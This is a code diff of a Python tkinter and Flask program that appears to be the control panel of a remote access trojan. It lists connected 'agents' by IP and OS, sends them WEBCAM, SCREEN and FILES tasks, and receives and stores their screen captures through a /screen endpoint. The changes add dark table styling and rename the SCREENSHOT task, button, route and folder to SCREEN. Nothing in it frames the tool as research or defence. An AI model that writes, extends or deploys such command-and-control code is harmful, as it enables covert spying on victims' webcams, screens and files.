@@ -5,6 +5,7 @@ import time
 import queue
 import io
 from tkinter import ttk
+
 from PIL import Image, ImageTk
 import os as oos
 
@@ -85,7 +86,7 @@ def open_image_window(agent_id, label, img_bytes):
             return
         user = get_user(agent_id)
         if user:
-            user.add_task("SCREENSHOT")
+            user.add_task("SCREEN")
 
     agent_windows[agent_id] = {"win": win, "img_label": img_label, "request_next": request_next}
 
@@ -148,11 +149,17 @@ def render():
     title.pack(anchor="w", padx=15, pady=(15, 5))
 
 
+    style = ttk.Style()
+    style.theme_use("clam")
+    style.configure("Treeview", background="#0D0D0D", foreground="#FFFFFF", fieldbackground="#0D0D0D", rowheight=28, bordercolor="#444444", borderwidth=1, relief="solid")
+    style.configure("Treeview.Heading", background="#111111", foreground="#AAAAAA", relief="flat")
+    style.map("Treeview", background=[("selected", "#1E1E1E")], foreground=[("selected", "#FFFFFF")])
+
     connections_table = ttk.Treeview(
         active_frame,
         columns=("id", "ip", "os", "name", "status"),
         show="headings",
-        selectmode="browse"
+        selectmode="browse",
     )
 
     connections_table.heading("id", text="ID")
@@ -196,7 +203,7 @@ def render():
 
         allowed_tasks = {
             "WEBCAM": "WEBCAM",
-            "SCREENSHOT": "SCREENSHOT",
+            "SCREEN": "SCREEN",
             "FILES": "FILES"
         }
 
@@ -206,7 +213,7 @@ def render():
 
         task = allowed_tasks[task_name]
 
-        if task == "SCREENSHOT":
+        if task == "SCREEN":
             streaming_agents.add(agent_id)
 
         get_user(agent_id).add_task(task)
@@ -230,10 +237,10 @@ def render():
     )
     webcam_btn.pack(side="left", padx=(0, 8))
 
-    screenshot_btn = tk.Button(
+    screen_btn = tk.Button(
         actions_frame,
-        text="SCREENSHOT",
-        command=lambda: send_ui_task("SCREENSHOT"),
+        text="SCREEN",
+        command=lambda: send_ui_task("SCREEN"),
         bg="#000000",
         fg="#FFAA00",
         activebackground="#222222",
@@ -244,7 +251,7 @@ def render():
         padx=15,
         pady=6
     )
-    screenshot_btn.pack(side="left", padx=8)
+    screen_btn.pack(side="left", padx=8)
 
     file_btn = tk.Button(
         actions_frame,
@@ -372,8 +379,8 @@ def task_check():
 
     return jsonify({"task": "NONE"})
     
-@app.route("/screenshot", methods=["POST"])
-def screenshot():
+@app.route("/screen", methods=["POST"])
+def screen():
     id = request.form.get("id")
     file = request.files.get("file")
 
@@ -385,8 +392,8 @@ def screenshot():
     user = get_user(id)
     label = user.name if user else request.remote_addr
 
-    oos.makedirs("screenshots", exist_ok=True)
-    with open(f"screenshots/{request.remote_addr}_{time.time()}.png", "wb") as f:
+    oos.makedirs("screens", exist_ok=True)
+    with open(f"screens/{request.remote_addr}_{time.time()}.png", "wb") as f:
         f.write(img_bytes)
 
     image_queue.put((id, label, img_bytes))
